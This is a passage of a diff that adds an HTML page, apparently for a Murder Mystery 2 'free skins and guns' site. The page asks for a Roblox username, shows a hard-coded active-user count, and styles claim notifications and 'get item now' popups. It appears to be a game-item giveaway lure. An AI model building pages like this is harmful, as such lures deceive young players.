@@ -1,0 +1,2599 @@
+<!DOCTYPE html><html lang="en" dir="ltr"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+  <!-- SEO OPTIMIZED TITLE & DESCRIPTION -->
+  <title>Murder Mystery 2 Skins and Guns 2026 | Get Chroma, Ancient, Godly Knives & More</title>
+  <meta name="description" content="Murder Mystery 2 skins, guns, and knives for 2026. Browse Chroma, Ancient, and Godly-style collections.">
+  <meta name="keywords" content="murder mystery 2, murder mystery 2 skins, murder mystery 2 guns, roblox murder mystery 2, murder mystery 2 knives, murder mystery 2 items">
+  <meta name="author" content="MURDER MYSTERY 2">
+  <meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">
+  
+  <!-- Open Graph for Social Media -->
+  <meta property="og:title" content="Murder Mystery 2 Skins and Guns 2026">
+  <meta property="og:description" content="Browse Murder Mystery 2 skins, guns, and knives, including Chroma and Godly items.">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://www.mm2guns.site/">
+  <meta property="og:image" content="images/logo2.webp">
+  
+  <!-- Twitter Cards -->
+  <meta name="twitter:title" content="Murder Mystery 2 Skins and Guns 2026">
+  <meta name="twitter:description" content="Browse Murder Mystery 2 skins, guns, and knives.">
+  <meta name="twitter:card" content="summary_large_image">
+  
+  <!-- Additional SEO -->
+  <meta name="language" content="English">
+  <meta name="revisit-after" content="1 days">
+  <meta name="distribution" content="global">
+  <link rel="canonical" href="https://www.mm2guns.site/">
+  <link rel="icon" type="image/png" href="https://static.wikia.nocookie.net/murder-mystery-2/images/d/d5/Ctg3.png/revision/latest?cb=20260222171723">
+  <link rel="apple-touch-icon" href="https://static.wikia.nocookie.net/murder-mystery-2/images/d/d5/Ctg3.png/revision/latest?cb=20260222171723">
+  
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap" rel="stylesheet">
+  <script src="js/jquery-3.6.0.min.js"></script>
+  <script src="js/profile-avatars.js"></script>
+  
+  <!-- Structured Data for Rich Snippets -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebApplication",
+    "name": "MURDER MYSTERY 2",
+    "description": "Murder Mystery 2 skins and guns collection featuring Chroma, Ancient, and Godly knives.",
+    "url": "https://www.mm2guns.site/",
+    "applicationCategory": "Game",
+    "operatingSystem": "Web Browser",
+    "offers": {
+      "@type": "Offer",
+      "price": "0",
+      "priceCurrency": "USD",
+      "description": "Murder Mystery 2 skins and guns"
+    },
+    "author": {
+      "@type": "Organization",
+      "name": "MURDER MYSTERY 2"
+    },
+    "screenshot": "images/logo2.webp",
+    "softwareVersion": "1.0"
+  }
+  </script>
+  
+  <!-- Additional Structured Data for Items -->
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "ItemList",
+    "name": "Available Murder Mystery 2 Skins and Guns",
+    "description": "Collection of Murder Mystery 2 skins, guns, and knives",
+    "itemListElement": [
+      {
+        "@type": "ListItem",
+        "position": 1,
+        "item": {
+          "@type": "Product",
+          "name": "Chroma Blizzard Gun",
+          "description": "Murder Mystery 2 Chroma gun skin",
+          "image": "images/ChromaBlizzardGun.webp"
+        }
+      },
+      {
+        "@type": "ListItem",
+        "position": 2,
+        "item": {
+          "@type": "Product",
+          "name": "Chroma Snow Dagger",
+          "description": "Murder Mystery 2 Chroma knife skin",
+          "image": "images/ChromaSnowDagger.webp"
+        }
+      },
+      {
+        "@type": "ListItem",
+        "position": 3,
+        "item": {
+          "@type": "Product",
+          "name": "Chroma Sunset Gun",
+          "description": "Murder Mystery 2 Chroma gun skin",
+          "image": "images/ChromaSunsetGun.webp"
+        }
+      }
+    ]
+  }
+  </script>
+  <style>
+    :root {
+      --bg-gradient: linear-gradient(135deg, #1a2a33 0%, #2e8b57 100%);
+      --card-bg: rgba(255, 255, 255, 0.1);
+      --accent: #10b981;
+      --accent2: #2563eb;
+      --accent3: #f97316;
+      --accent4: #e11d48;
+      --text-main: #ffffff;
+      --text-muted: #e5e7eb;
+      --card-radius: 18px;
+      --shadow: 0 4px 24px 0 rgba(0,0,0,0.18);
+    }
+    
+    body {
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      font-family: 'Poppins', Arial, sans-serif;
+      background: url('images/bg.png') no-repeat center center fixed;
+      background-size: cover;
+      color: var(--text-main);
+      box-sizing: border-box;
+      overflow-x: hidden;
+      text-align: left;
+    }
+    
+    /* Background MM2 skin styles */
+    .background-mm2-skins {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+      overflow: hidden;
+    }
+    
+    .floating-mm2-skin {
+      position: absolute;
+      width: 95px;
+      height: 95px;
+      opacity: 0.8;
+      border-radius: 50%;
+      background: rgba(255, 255, 255, 0.15);
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      will-change: transform;
+      transform: translate3d(0, 0, 0);
+      box-shadow: 0 0 20px rgba(255, 255, 255, 0.2);
+    }
+    
+    .floating-mm2-skin:hover {
+      opacity: 1;
+      transform: scale(1.15);
+      box-shadow: 0 0 30px rgba(255, 255, 255, 0.4);
+    }
+    
+    .floating-mm2-skin img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      border-radius: 50%;
+      padding: 8px;
+      box-sizing: border-box;
+    }
+    
+    /* Responsive adjustments for background MM2 skins */
+    @media (max-width: 768px) {
+      .floating-mm2-skin {
+        width: 80px;
+        height: 80px;
+      }
+    }
+    
+    @media (max-width: 480px) {
+      .floating-mm2-skin {
+        width: 70px;
+        height: 70px;
+      }
+    }
+    
+    .logo-container {
+      text-align: center;
+      padding-top: 18px;
+    }
+    .logo-container img {
+      max-width: 160px;
+      filter: drop-shadow(0 0 18px rgba(255, 115, 0, 0.95)) drop-shadow(0 0 8px rgba(124, 58, 237, 0.75));
+      border-radius: 22px;
+      background: rgba(168, 85, 247, 0.08);
+      box-shadow: 0 2px 18px #0003;
+    }
+    .content {
+      position: relative;
+      z-index: 1;
+    }
+    .top-bar {
+      width: 100vw;
+      display: flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      gap: 14px;
+      box-sizing: border-box;
+      padding: 18px 0 0 0;
+      margin-bottom: 8px;
+      position: relative;
+    }
+    
+    /* Modern Illustrated Corner Theme Toggle */
+    .theme-toggle {
+      position: fixed;
+      top: 25px;
+      right: 25px;
+      width: 120px;
+      height: 56px;
+      border-radius: 999px;
+      background: #22b8cf;
+      border: none;
+      cursor: pointer;
+      display: inline-flex;
+      align-items: center;
+      padding: 0;
+      transition: background 0.5s ease, box-shadow 0.4s ease, transform 0.2s ease;
+      z-index: 1000;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+      overflow: hidden;
+    }
+    .theme-toggle:hover { transform: scale(1.06); }
+    .theme-toggle:active { transform: scale(0.98); }
+    
+    .theme-toggle .toggle-track {
+      position: absolute;
+      inset: 0;
+      border-radius: inherit;
+      display: block;
+      overflow: hidden;
+    }
+    /* Clouds (day) */
+    .theme-toggle .cloud {
+      position: absolute;
+      width: 26px; height: 16px;
+      background: #fff;
+      border-radius: 16px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.12));
+      opacity: 1;
+      transition: opacity 0.45s ease, transform 0.6s ease;
+    }
+    .theme-toggle .cloud::after,
+    .theme-toggle .cloud::before{
+      content: '';
+      position: absolute;
+      background: #fff;
+      border-radius: 50%;
+    }
+    .theme-toggle .cloud::before{ width: 12px; height: 12px; left: -6px; top: -4px; }
+    .theme-toggle .cloud::after{ width: 16px; height: 16px; right: -8px; top: -6px; }
+    .theme-toggle .cloud.c1{ right: 20px; top: 12px; }
+    .theme-toggle .cloud.c2{ right: 44px; bottom: 10px; transform: scale(0.9); }
+    
+    /* Stars (night) */
+    .theme-toggle .star{
+      position: absolute;
+      width: 6px; height: 6px;
+      background: #fff;
+      border-radius: 50%;
+      box-shadow: 0 0 6px rgba(255,255,255,0.8);
+      opacity: 0;
+      transform: scale(0.6);
+      transition: opacity 0.45s ease 0.05s, transform 0.45s ease;
+    }
+    .theme-toggle .star.s1{ left: 26px; top: 16px; }
+    .theme-toggle .star.s2{ left: 46px; top: 8px; width:5px; height:5px; }
+    .theme-toggle .star.s3{ left: 64px; top: 26px; width:7px; height:7px; }
+    
+    /* Thumb (sun/moon) */
+    .theme-toggle .toggle-thumb{
+      position: relative;
+      margin-left: 6px;
+      width: 44px; height: 44px;
+      border-radius: 50%;
+      background: radial-gradient(circle at 30% 30%, #ffd54a, #f6b500);
+      box-shadow: 0 6px 16px rgba(246,181,0,0.45);
+      transition: transform 0.5s cubic-bezier(.22,.61,.36,1), background 0.5s ease, box-shadow 0.5s ease;
+      z-index: 2;
+    }
+    /* Craters for moon (hidden in day) */
+    .theme-toggle .toggle-thumb::before,
+    .theme-toggle .toggle-thumb::after{
+      content: '';
+      position: absolute;
+      border-radius: 50%;
+      background: rgba(0,0,0,0.08);
+      opacity: 0; transition: opacity 0.4s ease;
+    }
+    .theme-toggle .toggle-thumb::before{ width:10px; height:10px; left:10px; top:10px; }
+    .theme-toggle .toggle-thumb::after{ width:7px; height:7px; right:12px; bottom:12px; }
+    
+    /* Night state */
+    .theme-toggle.night-mode{ background: #0f172a; }
+    .theme-toggle.night-mode .toggle-thumb{
+      transform: translateX(64px);
+      background: radial-gradient(circle at 30% 30%, #ccd5e1, #9aa5b1);
+      box-shadow: 0 6px 16px rgba(156,163,175,0.45);
+    }
+    .theme-toggle.night-mode .toggle-thumb::before,
+    .theme-toggle.night-mode .toggle-thumb::after{ opacity: 1; }
+    .theme-toggle.night-mode .cloud{ opacity: 0; transform: translateY(-6px); }
+    .theme-toggle.night-mode .star{ opacity: 1; transform: scale(1); }
+    
+    /* Night Mode Styles */
+    body.night-mode {
+      background: url('images/night%20bg.jpg') no-repeat center center fixed;
+      background-size: cover;
+    }
+    
+    body.night-mode .item-card {
+      background: rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.1);
+    }
+    
+    body.night-mode .active-users-box {
+      background: rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.1);
+    }
+    
+    body.night-mode .floating-mm2-skin {
+      background: rgba(0, 0, 0, 0.2);
+      border-color: rgba(255, 255, 255, 0.1);
+    }
+    
+    /* Night Mode Popup Text - White for Readability */
+    body.night-mode .message .more div:first-child {
+      color: var(--accent3);
+    }
+    
+    body.night-mode .message .more div:last-child {
+      color: #ffffff;
+    }
+    .active-users-box {
+      background: rgba(255, 255, 255, 0.1);
+      border: 2.5px solid rgba(255, 255, 255, 0.3);
+      border-radius: var(--card-radius);
+      padding: 13px 18px;
+      display: flex;
+      align-items: center;
+      font-size: 1.5em;
+      min-width: 220px;
+      max-width: 70vw;
+      margin: 0;
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+      font-weight: 700;
+      font-family: 'Poppins', Arial, sans-serif;
+      height: 54px;
+      justify-content: center;
+      cursor: pointer;
+      transition: transform 0.17s cubic-bezier(.17,.67,.83,.67), box-shadow 0.2s;
+      will-change: transform;
+      position: relative;
+      overflow: hidden;
+      color: var(--accent);
+    }
+    .active-users-box:after {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: -100%;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+      transition: 0.5s;
+    }
+    .active-users-box:hover:after {
+      left: 100%;
+    }
+    .active-users-box:active {
+      transform: scale(1.09) rotate(-2deg);
+      box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.3), 0 2px 6px rgba(0, 0, 0, 0.3);
+      z-index: 2;
+      filter: brightness(1.08);
+      background: rgba(255, 255, 255, 0.2);
+      color: #fff;
+    }
+    .active-users-box span:first-child {
+      color: var(--accent3);
+      margin-right: 8px;
+      font-weight: 900;
+      font-size: 1.1em;
+      letter-spacing: 1px;
+    }
+    .active-users-count {
+      font-weight: 900;
+      font-family: 'Poppins', Arial, sans-serif;
+      margin-left: 8px;
+      font-size: 1.15em;
+      color: var(--accent4);
+      text-shadow: 0 0 8px var(--accent4);
+    }
+    .select-title {
+      margin: 30px 0 24px 0;
+      text-align: center;
+      font-size: 2em;
+      color: var(--accent2);
+      font-family: 'Poppins', Arial, sans-serif;
+      letter-spacing: .4px;
+      font-weight: 900;
+      padding: 8px 0;
+      position: relative;
+    }
+    .select-title:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 25%;
+      width: 50%;
+      height: 3px;
+      background: linear-gradient(to right, transparent, var(--accent3), transparent);
+    }
+    
+    .info-section {
+      text-align: center;
+      margin: 40px auto;
+      max-width: 800px;
+      padding: 0 20px;
+    }
+    
+    .info-section h2 {
+      color: var(--accent2);
+      font-size: 1.8em;
+      margin-bottom: 20px;
+      font-weight: 700;
+    }
+    
+    .info-section p {
+      color: var(--text-main);
+      font-size: 1.1em;
+      line-height: 1.6;
+      margin: 0;
+      opacity: 0.9;
+    }
+    .items-grid {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 26px;
+      margin-bottom: 40px;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    .items-row {
+      display: flex;
+      gap: 22px;
+      width: 100%;
+      justify-content: center;
+      box-sizing: border-box;
+    }
+    .item-card {
+      background: var(--card-bg);
+      border-radius: var(--card-radius);
+      box-shadow: 0 4px 16px rgba(0, 0, 0, 0.2);
+      padding: 14px 10px 10px 10px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 170px;
+      min-width: 100px;
+      max-width: 31vw;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      margin: 0;
+      position: relative;
+      cursor: pointer;
+      transition: all 0.3s cubic-bezier(.17,.67,.83,.67);
+      will-change: transform;
+      overflow: hidden;
+      color: var(--text-main);
+      -webkit-tap-highlight-color: transparent;
+      touch-action: manipulation;
+    }
+    .item-card:before {
+      content: '';
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: linear-gradient(45deg, rgba(255, 255, 255, 0.1) 0%, transparent 100%);
+      opacity: 0.2;
+      transition: opacity 0.3s;
+    }
+    .item-card:hover {
+      transform: translateY(-3px) scale(1.02);
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
+      border-color: rgba(255, 255, 255, 0.3);
+      background: rgba(255, 255, 255, 0.15);
+    }
+    .item-card:active {
+      transform: scale(1.05) rotate(-1deg);
+      box-shadow: 0 0 0 4px rgba(255, 255, 255, 0.2), 0 2px 8px rgba(0, 0, 0, 0.2);
+      z-index: 2;
+    }
+    .item-card.selected {
+      background: linear-gradient(135deg, rgba(251, 191, 36, 0.8), rgba(244, 114, 182, 0.8));
+      border: 2px solid rgba(251, 191, 36, 0.8);
+      box-shadow: 0 0 20px rgba(251, 191, 36, 0.4);
+      animation: goldenGlow 1.5s infinite alternate;
+      color: #222;
+      position: relative;
+    }
+    
+    .item-card.selected::after {
+      content: '✓';
+      position: absolute;
+      top: 5px;
+      right: 5px;
+      width: 20px;
+      height: 20px;
+      background: #22c55e;
+      color: white;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      font-weight: bold;
+      box-shadow: 0 0 10px rgba(34, 197, 94, 0.6);
+    }
+    
+    .continue-btn {
+      transition: transform 0.2s, box-shadow 0.2s;
+    }
+    
+    .continue-btn:hover {
+      transform: scale(1.05);
+      box-shadow: 0 4px 20px rgba(34, 197, 94, 0.5);
+    }
+    
+    .continue-btn:active {
+      transform: scale(0.98);
+    }
+    
+    .error-message-container {
+      background-color: rgba(225, 29, 72, 0.1);
+      border: 1px solid rgba(225, 29, 72, 0.3);
+      border-radius: 8px;
+      padding: 10px;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+    
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    
+    @keyframes pulseButton {
+      from { transform: scale(1); box-shadow: 0 2px 16px rgba(34, 197, 94, 0.3), 0 0 20px rgba(34, 197, 94, 0.4); }
+      to { transform: scale(1.05); box-shadow: 0 2px 25px rgba(34, 197, 94, 0.6), 0 0 30px rgba(34, 197, 94, 0.7); }
+    }
+    @keyframes goldenGlow {
+      from {
+        box-shadow: 0 0 10px var(--accent3);
+      }
+      to {
+        box-shadow: 0 0 25px var(--accent3);
+      }
+    }
+    .item-img {
+      width: 110px;
+      height: 110px;
+      object-fit: cover;
+      border-radius: 12px;
+      background: #eaeaea11;
+      margin-bottom: 10px;
+      border: none;
+      image-rendering: pixelated;
+      box-shadow: 0 0 13px #0001;
+      transition: box-shadow 0.12s, filter 0.12s;
+      display: block;
+      position: relative;
+      z-index: 1;
+    }
+    .item-card.selected .item-img {
+      box-shadow: 0 0 15px var(--accent3);
+      filter: brightness(1.05) contrast(1.1);
+    }
+    .item-name {
+      font-size: 1.13em;
+      color: var(--accent);
+      font-family: 'Poppins', Arial, sans-serif;
+      text-align: center;
+      font-weight: 700;
+      letter-spacing: .2px;
+      margin-bottom: 0;
+      line-height: 1.2;
+      width: 100%;
+      overflow: hidden;
+      white-space: nowrap;
+      text-overflow: ellipsis;
+      background: none;
+      border-radius: 0;
+      border: none;
+      margin-top: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-sizing: border-box;
+      min-height: 28px;
+      position: relative;
+      z-index: 1;
+    }
+    .item-card.selected .item-name {
+      color: #fff;
+      text-shadow: 0 0 2px var(--accent3);
+    }
+    /* Notification styles */
+    .cliameds {
+      position: fixed;
+      bottom: 65px;
+      left: 15px;
+      z-index: 9999;
+      pointer-events: none;
+    }
+    .message {
+      background: rgba(255, 255, 255, 0.15);
+      display: flex;
+      font-size: .9rem;
+      align-items: center;
+      padding: 12px 22px;
+      border-radius: 10px;
+      border: 2px solid rgba(255, 255, 255, 0.3);
+      position: relative;
+      overflow: hidden;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      color: #fff;
+      pointer-events: none;
+    }
+    .message:after {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -60%;
+      width: 20%;
+      height: 200%;
+      background: rgba(255, 255, 255, 0.2);
+      transform: rotate(30deg);
+      transition: all 0.5s;
+      pointer-events: none;
+    }
+    .message:hover:after {
+      left: 120%;
+    }
+    .message .img {
+      padding-right: 10px;
+      z-index: 2;
+      pointer-events: none;
+    }
+    .message .img img {
+      width: 50px;
+      background: rgba(255, 255, 255, 0.2);
+      border-radius: 50%;
+      height: 50px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.3);
+      pointer-events: none;
+    }
+    .message .more {
+      pointer-events: none;
+    }
+    .message .more div:first-child {
+      font-weight: bold;
+      color: var(--accent3);
+      pointer-events: none;
+    }
+    .message .more div:last-child {
+      color: #000000;
+      font-weight: 700;
+      pointer-events: none;
+    }
+    /* Responsive grid for desktop */
+    @media (min-width: 900px) {
+      .items-grid {
+        display: grid;
+        grid-template-columns: repeat(5, 1fr);
+        gap: 20px;
+        justify-content: center;
+        padding: 0 5%;
+      }
+      .items-row {
+        display: contents;
+      }
+      .item-card {
+        width: 100%;
+        max-width: 180px;
+        margin: 0 auto;
+      }
+    }
+    /* Mobile-first adjustments */
+    @media (max-width: 900px) {
+      .items-grid {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        gap: 15px;
+        padding: 0 15px;
+        width: 100%;
+        box-sizing: border-box;
+        margin-bottom: 40px;
+      }
+      .items-row {
+        display: contents;
+      }
+      .active-users-box {
+        font-size: 1.1em;
+        min-width: 145px;
+        padding: 9px 8px;
+        height: 38px;
+      }
+      .select-title {
+        font-size: 1.3em;
+        margin: 20px 0 15px 0;
+      }
+      .item-card {
+        width: 100%;
+        min-width: 0;
+        max-width: 100%;
+        padding: 10px 5px 8px 5px;
+        margin: 0 auto;
+        box-sizing: border-box;
+      }
+      .item-img {
+        width: 90px;
+        height: 90px;
+      }
+      .item-name {
+        min-height: 22px;
+        font-size: 0.95em;
+        padding: 0 5px;
+      }
+      .continue-button-container {
+        padding: 10px 0;
+      }
+      .continue-btn {
+        font-size: 1.2em;
+        padding: 15px 30px;
+      }
+    }
+    @media (max-width: 700px) {
+      .items-grid {
+        grid-template-columns: repeat(2, 1fr);
+        gap: 12px;
+        padding: 0 10px;
+      }
+      .item-card {
+        padding: 12px 8px 8px 8px;
+        border-radius: 14px;
+      }
+      .item-img {
+        width: 85px;
+        height: 85px;
+        border-radius: 10px;
+      }
+      .item-name {
+        font-size: 0.92em;
+        min-height: 20px;
+        padding: 0 3px;
+        margin-top: 6px;
+      }
+      .theme-toggle {
+        width: 100px;
+        height: 46px;
+        top: 15px;
+        right: 15px;
+      }
+      .theme-toggle .toggle-thumb {
+        width: 36px;
+        height: 36px;
+      }
+      .theme-toggle.night-mode .toggle-thumb {
+        transform: translateX(54px);
+      }
+    }
+    @media (max-width: 500px) {
+      .items-grid {
+        gap: 10px;
+        padding: 0 8px;
+      }
+      .item-card {
+        border-radius: 12px;
+        padding: 10px 5px 6px 5px;
+        border-width: 1.5px;
+      }
+      .item-img {
+        width: 75px;
+        height: 75px;
+        min-width: 0;
+        min-height: 0;
+        max-width: 100%;
+        max-height: 100%;
+        margin-bottom: 6px;
+      }
+      .item-name {
+        font-size: 0.85em;
+        min-height: 16px;
+        line-height: 1.1;
+      }
+      .logo-container img {
+        max-width: 110px;
+      }
+      .cliameds {
+        left: 5px;
+        bottom: 45px;
+      }
+      .message {
+      padding: 10px 15px;
+      font-size: 0.8rem;
+    }
+    .message .img img {
+      width: 40px;
+      height: 40px;
+    }
+    .message .country-flag {
+      display: inline-block;
+      margin-left: 5px;
+      font-size: 0.8em;
+      background: rgba(255, 255, 255, 0.15);
+      padding: 2px 5px;
+      border-radius: 4px;
+      color: #fff;
+      font-weight: bold;
+    }
+    .select-title {
+      font-size: 1.2em;
+      margin: 15px 0 12px 0;
+    }
+    .active-users-box {
+      font-size: 1em;
+      min-width: 130px;
+      padding: 8px 6px;
+      height: 34px;
+    }
+    }
+    /* Popup styles */
+    .purchase-popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.7);
+      z-index: 1000;
+      justify-content: center;
+      align-items: center;
+      backdrop-filter: blur(5px);
+    }
+    .popup-content {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 25px;
+      border-radius: 18px;
+      width: 90%;
+      max-width: 380px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      color: var(--text-main);
+      margin: auto;
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      border: 2px solid rgba(255, 255, 255, 0.2);
+    }
+    .popup-header {
+      position: relative;
+      padding-bottom: 20px;
+      margin-bottom: 15px;
+    }
+    .popup-header h3 {
+      font-size: 24px;
+      margin: 0;
+      color: var(--accent2);
+      font-weight: 700;
+    }
+    .popup-header:after {
+      content: '';
+      position: absolute;
+      bottom: 0;
+      left: 10%;
+      right: 10%;
+      height: 3px;
+      background: var(--accent3);
+    }
+    .item-popup-image {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 0.3cm auto;
+      border: 3px solid var(--accent2);
+      box-shadow: 0 4px 12px var(--accent2);
+    }
+    .item-confirm {
+      font-size: 18px;
+      margin: 0.3cm 0;
+      color: var(--accent);
+      font-weight: 700;
+      line-height: 1.4;
+    }
+    .input-group input {
+      width: 92%;
+      padding: 15px 12px;
+      background: rgba(255, 255, 255, 0.1);
+      color: var(--text-main);
+      border: 1.5px solid rgba(255, 255, 255, 0.3);
+      border-radius: 7px;
+      font-size: 15px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+    }
+    .input-group input:focus {
+      outline: none;
+      border-color: rgba(255, 255, 255, 0.6);
+      background: rgba(255, 255, 255, 0.15);
+      box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+    }
+    .input-group input::placeholder {
+      color: rgba(255, 255, 255, 0.6);
+      font-weight: 700;
+    }
+    .popup-buttons {
+      display: flex;
+      flex-direction: row;
+      gap: 16px;
+      margin-top: 18px;
+    }
+    .cancel-btn, .action-btn {
+      flex: 1;
+      width: auto;
+      min-width: 0;
+      border-radius: 10px;
+      font-size: 1.1em;
+      padding: 14px 0;
+      font-weight: 700;
+      box-shadow: 0 2px 8px #0002;
+      border: none;
+      transition: background 0.2s, color 0.2s, box-shadow 0.2s;
+    }
+    .cancel-btn {
+      background: #ef4444;
+      color: #fff;
+    }
+    .cancel-btn:hover {
+      background: #b91c1c;
+      color: #fff;
+    }
+    .action-btn {
+      background: #22c55e;
+      color: #fff;
+    }
+    .action-btn:hover {
+      background: #15803d;
+      color: #fff;
+    }
+    .action-btn .action-badge {
+      color: #fff;
+      font-weight: 900;
+      font-size: 1em;
+    }
+    @media (max-width: 600px) {
+      .popup-buttons {
+        flex-direction: column;
+        gap: 10px;
+      }
+      .cancel-btn, .action-btn {
+        font-size: 1em;
+        padding: 12px 0;
+      }
+    }
+    .searching-text {
+      color: var(--accent2);
+      font-size: 18px;
+      margin-top: 20px;
+    }
+    .user-error {
+      color: #ff6b6b;
+      font-size: 14px;
+      margin-top: 5px;
+      text-align: center;
+    }
+    .result-avatar {
+      width: 130px;
+      height: 130px;
+      border-radius: 50%;
+      object-fit: cover;
+      margin: 15px auto;
+      border: 3px solid var(--accent2);
+    }
+    .result-username {
+      color: var(--accent3);
+      font-size: 18px;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+    .get-item-now-btn {
+      background: var(--accent3);
+      color: #222;
+      border: none;
+      padding: 12px;
+      border-radius: 7px;
+      font-weight: bold;
+      cursor: pointer;
+      width: 100%;
+      font-size: 16px;
+      margin-top: 15px;
+      transition: background 0.3s, color 0.3s;
+    }
+    .get-item-now-btn:hover {
+      background: var(--accent2);
+      color: #fff;
+    }
+    .d-none {
+      display: none !important;
+    }
+    /* Loader styles */
+    .folding {
+      margin: 20px auto;
+      width: 70px;
+      height: 70px;
+      position: relative;
+      transform: rotateZ(45deg);
+    }
+    .square {
+      position: absolute;
+      top: 30%;
+      right: 30%;
+      width: 30px;
+      height: 30px;
+      background: var(--accent2);
+      transform: rotateZ(87deg);
+    }
+    .folding .sk-cube {
+      float: left;
+      width: 50%;
+      height: 50%;
+      position: relative;
+      transform: scale(1.1);
+    }
+    .folding .sk-cube:before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: var(--accent3);
+      animation: sk-foldCubeAngle 2.4s infinite linear both;
+      transform-origin: 100% 100%;
+    }
+    .folding .sk-cube2 {
+      transform: scale(1.1) rotateZ(90deg);
+    }
+    .folding .sk-cube3 {
+      transform: scale(1.1) rotateZ(180deg);
+    }
+    .folding .sk-cube4 {
+      transform: scale(1.1) rotateZ(270deg);
+    }
+    .folding .sk-cube2:before {
+      animation-delay: 0.3s;
+    }
+    .folding .sk-cube3:before {
+      animation-delay: 0.6s;
+    }
+    .folding .sk-cube4:before {
+      animation-delay: 0.9s;
+    }
+    @keyframes sk-foldCubeAngle {
+      0%, 10% {
+        transform: perspective(140px) rotateX(-180deg);
+        opacity: 0;
+      }
+      25%, 75% {
+        transform: perspective(140px) rotateX(0deg);
+        opacity: 1;
+      }
+      90%, 100% {
+        transform: perspective(140px) rotateY(180deg);
+        opacity: 0;
+      }
+    }
+    /* Sound icon for buttons */
+    .sound-icon {
+      margin-left: 5px;
+      font-size: 14px;
+    }
+    /* MM2 skin names */
+    .mm2-skin-name {
+      color: #fbbf24;
+      font-weight: bold;
+    }
+  </style>
+
+</head>
+<body>
+
+  <!-- Background MM2 Items Container -->
+  <div class="background-mm2-skins" id="backgroundMm2Skins">
+    <!-- MM2 skins will be dynamically added here -->
+  </div>
+
+  <div class="logo-container">
+    <img src="images/logo2.webp" alt="Murder Mystery 2 Skins and Guns" border="0">
+  </div>
+  
+  <div class="content">
+    <div class="top-bar">
+      <div class="active-users-box">
+        <span>Active users :</span>
+        <span class="active-users-count" id="activeUsersCount">177</span>
+        </div>
+        <button class="theme-toggle" id="themeToggle">
+          <span class="toggle-track">
+            <span class="cloud c1"></span>
+            <span class="cloud c2"></span>
+            <span class="star s1"></span>
+            <span class="star s2"></span>
+            <span class="star s3"></span>
+          </span>
+          <span class="toggle-thumb"></span>
+        </button>
+      </div>
+
+    <div class="main-username-bar" style="max-width:520px;margin:0 auto 24px auto;padding:0 18px;box-sizing:border-box;">
+      <div style="font-weight:800;color:var(--accent3);text-align:center;margin-bottom:12px;letter-spacing:.3px;font-size:1.1em;">Enter your Roblox username</div>
+      <div class="input-group" style="margin:0 auto;">
+        <input type="text" id="main-username-input" placeholder="Roblox username" autocomplete="off" spellcheck="false" style="width:100%;padding:15px 12px;background:rgba(255,255,255,0.1);color:var(--text-main);border:1.5px solid rgba(255,255,255,0.3);border-radius:10px;font-size:15px;font-weight:600;transition:all 0.3s ease;box-sizing:border-box;" />
+      </div>
+    </div>
+
+    <div class="select-title">
+      SELECT YOUR GUN OR KNIFE
+    </div>
+
+    <div class="items-grid" id="itemsGrid">
+      <div class="items-row">
+        <div class="item-card"><img class="item-img" src="images/Chroma_Emberscythe.webp" alt="Chroma Emberscythe"><div class="item-name mm2-skin-name">Chroma Emberscythe</div></div>
+        <div class="item-card"><img class="item-img" src="images/Chroma_Emberbow.webp" alt="Chroma Emberbow"><div class="item-name mm2-skin-name">Chroma Emberbow</div></div>
